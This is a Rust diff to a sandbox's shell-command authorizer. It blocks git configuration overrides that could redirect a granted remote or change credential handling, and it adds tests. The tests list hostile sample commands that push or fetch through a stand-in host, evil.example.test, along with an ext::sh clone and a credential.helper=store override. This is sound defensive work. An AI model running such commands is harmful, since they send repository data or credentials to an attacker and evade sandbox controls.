@@ -697,6 +697,55 @@ fn scan_shell_c(
     Ok(())
 }
 
+/// Configuration keys that could redirect a granted remote alias, log in, or
+/// rewrite a granted URL. A command-line override of one of these would make
+/// the alias/URL check describe a different destination than git contacts.
+const REDIRECTING_CONFIG_KEYS: &[&str] = &["remote.", "url.", "credential.", "http.extraheader"];
+
+/// `-c`, `-cNAME=VALUE`, `--config NAME=VALUE`, `--config=NAME=VALUE`,
+/// `--config-env NAME=ENVVAR`, and the `=` spellings. The host pins granted
+/// aliases through `GIT_CONFIG_*`; an in-command override of the same key
+/// would otherwise win.
+fn config_overrides(words: &[Word], index: usize) -> Vec<String> {
+    let word = &words[index].text;
+    if word == "-c" || word == "--config" || word == "--config-env" {
+        return words
+            .get(index + 1)
+            .map(|w| vec![w.text.clone()])
+            .unwrap_or_default();
+    }
+    if let Some(value) = word
+        .strip_prefix("--config=")
+        .or_else(|| word.strip_prefix("--config-env="))
+    {
+        return vec![value.to_string()];
+    }
+    match word.strip_prefix("-c") {
+        Some(value) if !word.starts_with("--") && !value.is_empty() => vec![value.to_string()],
+        _ => Vec::new(),
+    }
+}
+
+fn refuse_redirecting_config(overrides: &[String]) -> Result<()> {
+    for override_value in overrides {
+        let key = override_value
+            .split_once('=')
+            .map(|(key, _)| key)
+            .unwrap_or(override_value)
+            .trim()
+            .to_ascii_lowercase();
+        if REDIRECTING_CONFIG_KEYS
+            .iter()
+            .any(|prefix| key == **prefix || key.starts_with(prefix))
+        {
+            return Err(denied(format!(
+                "git configuration override '{key}' could redirect a granted remote; it is not permitted"
+            )));
+        }
+    }
+    Ok(())
+}
+
 /// Find the git subcommand, skipping global options that take a value.
 fn git_subcommand(words: &[Word]) -> std::result::Result<Option<usize>, SandboxError> {
     let mut index = 1;
@@ -708,6 +757,7 @@ fn git_subcommand(words: &[Word]) -> std::result::Result<Option<usize>, SandboxE
         if !word.starts_with('-') {
             return Ok(Some(index));
         }
+        refuse_redirecting_config(&config_overrides(words, index))?;
         let takes_value = matches!(
             word.as_str(),
             "-C" | "-c"
@@ -1230,6 +1280,10 @@ mod tests {
             "git fetch --all",
             "git remote update",
             "git clone ext::sh -c evil",
+            "git -c remote.origin.url=https://evil.example.test/r.git push origin main",
+            "git --config-env=remote.origin.url=EVIL push origin main",
+            "git -c url.https://evil.example.test/.insteadOf=https://git.example.test/ fetch origin",
+            "git -c credential.helper=store push origin main",
         ] {
             let error = authorize_shell_command(command, Some(&grant)).unwrap_err();
             assert!(
